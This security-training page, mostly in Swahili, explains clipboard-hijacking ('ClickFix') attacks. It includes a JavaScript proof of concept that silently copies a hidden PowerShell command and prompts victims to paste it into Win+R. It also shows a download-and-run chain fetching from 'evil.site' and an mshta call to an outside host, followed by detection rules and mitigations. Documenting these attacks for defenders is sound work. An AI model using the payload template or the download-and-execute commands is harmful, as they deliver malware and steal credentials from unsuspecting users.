# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Usiweke chochote ulichokosa mwenyewe." – ushauri wa zamani lakini bado ni wa maana

## Overview

Clipboard hijacking – pia inajulikana kama *pastejacking* – inatumia ukweli kwamba watumiaji mara nyingi huiga na kuweka amri bila kuzichunguza. Tovuti mbaya (au muktadha wowote unaoweza kutumia JavaScript kama vile programu ya Electron au Desktop) inaweka maandiko yanayodhibitiwa na mshambuliaji kwenye clipboard ya mfumo. Waathirika wanahimizwa, kawaida kwa maagizo ya uhandisi wa kijamii yaliyoundwa kwa uangalifu, kubonyeza **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), au kufungua terminal na *kweka* yaliyomo kwenye clipboard, mara moja wakitekeleza amri zisizo na mpangilio.

Kwa sababu **hakuna faili inayopakuliwa na hakuna kiambatisho kinachofunguliwa**, mbinu hii inapita karibu na udhibiti wote wa usalama wa barua pepe na maudhui ya wavuti yanayofuatilia viambatisho, macros au utekelezaji wa amri moja kwa moja. Shambulio hili kwa hivyo ni maarufu katika kampeni za phishing zinazotoa familia za malware za kawaida kama NetSupport RAT, Latrodectus loader au Lumma Stealer.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. Mtumiaji anatembelea tovuti iliyo na makosa ya tahajia au iliyovunjwa (e.g. `docusign.sa[.]com`)
2. JavaScript ya **ClearFake** iliyowekwa inaita `unsecuredCopyToClipboard()` msaada ambayo kimya kimya inahifadhi PowerShell one-liner iliyokuwa na Base64 katika clipboard.
3. Maelekezo ya HTML yanamwambia mwathirika: *“Bonyeza **Win + R**, bandika amri na bonyeza Enter kutatua tatizo.”*
4. `powershell.exe` inatekelezwa, ikipakua archive ambayo ina executable halali pamoja na DLL mbaya (classic DLL sideloading).
5. Loader inachambua hatua za ziada, inaingiza shellcode na kuanzisha kudumu (e.g. kazi iliyopangwa) – hatimaye inatekeleza NetSupport RAT / Latrodectus / Lumma Stealer.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (halali Java WebStart) inatafuta saraka yake kwa `msvcp140.dll`.
* DLL mbaya inatatua kwa dinamik API na **GetProcAddress**, inashusha binaries mbili (`data_3.bin`, `data_4.bin`) kupitia **curl.exe**, inazificha kwa kutumia ufunguo wa rolling XOR `"https://google.com/"`, inaingiza shellcode ya mwisho na inafungua **client32.exe** (NetSupport RAT) hadi `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Inapakua `la.txt` kwa kutumia **curl.exe**
2. Inatekeleza downloader ya JScript ndani ya **cscript.exe**
3. Inapata payload ya MSI → inatua `libcef.dll` pamoja na programu iliyosainiwa → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer kupitia MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** call launches a hidden PowerShell script that retrieves `PartyContinued.exe`, extracts `Boat.pst` (CAB), reconstructs `AutoIt3.exe` through `extrac32` & file concatenation and finally runs an `.a3x` script which exfiltrates browser credentials to `sumeriavgv.digital`.

## Detection & Hunting

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:
{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)

{{#include ../../banners/hacktricks-training.md}}
